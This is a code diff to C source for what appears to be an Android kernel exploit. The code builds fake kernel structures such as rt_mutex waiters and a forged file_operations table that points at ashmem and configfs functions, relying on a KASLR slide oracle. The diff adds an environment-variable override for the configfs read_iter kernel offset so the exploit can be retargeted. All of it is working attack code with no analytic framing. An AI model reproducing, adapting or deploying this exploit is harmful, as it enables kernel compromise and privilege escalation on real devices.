@@ -47,6 +47,9 @@ uintptr_t slide_oracle_target;
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
 char ashmem_path[256] = "/dev/ashmem";
+#if defined(CONFIGFS_READ_ITER_ENV_OVERRIDE) && CONFIGFS_READ_ITER_ENV_OVERRIDE
+uintptr_t configfs_read_iter_image = CONFIGFS_READ_ITER;
+#endif
 
 static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                             uintptr_t tree_parent, uintptr_t tree_right,
@@ -290,6 +293,23 @@ int same_rdev_path(const char *path, dev_t rdev) {
   return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
 }
 
+#if defined(CONFIGFS_READ_ITER_ENV_OVERRIDE) && CONFIGFS_READ_ITER_ENV_OVERRIDE
+void init_configfs_read_iter(void) {
+  const char *forced = getenv("CONFIGFS_READ_ITER_OFF");
+  if (forced && *forced) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long value = strtoull(forced, &end, 0);
+    if (!errno && end != forced && !*end && value && value < 0x10000000ULL) {
+      configfs_read_iter_image = KIMAGE_TEXT_BASE + (uintptr_t)value;
+    }
+  }
+  pr_info("configfs read_iter image=%016zx off=%08zx\n",
+          configfs_read_iter_image,
+          (uintptr_t)(configfs_read_iter_image - KIMAGE_TEXT_BASE));
+}
+#endif
+
 void init_ashmem_path(void) {
   char boot_id[128];
   int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
@@ -385,7 +405,7 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
         fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
-  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
+  put64(p, off + FOPS_READ_ITER_OFF, text_addr(configfs_read_iter_image));
   put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
   put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
   put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
